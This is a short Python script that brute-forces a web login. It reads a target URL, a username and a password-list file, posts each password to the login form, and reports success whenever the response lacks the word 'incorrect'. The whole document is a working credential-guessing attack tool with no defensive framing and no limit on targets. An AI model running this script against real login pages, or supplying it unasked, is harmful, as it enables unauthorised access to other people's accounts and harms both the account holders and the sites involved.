import requests

def run_brute_force():
    url = input("Enter login page URL: ")
    username = input("Enter username: ")
    password_list = input("Enter password list file: ")

    try:
        with open(password_list, "r") as passwords:
            for password in passwords:
                password = password.strip()
                data = {"username": username, "password": password}
                response = requests.post(url, data=data)
                
                if "incorrect" not in response.text.lower():
                    print(f"[+] Valid credentials found: {username}:{password}")
                    return
                
        print("[-] No valid credentials found.")
    
    except FileNotFoundError:
        print(f"[-] Error: Password file '{password_list}' not found.")
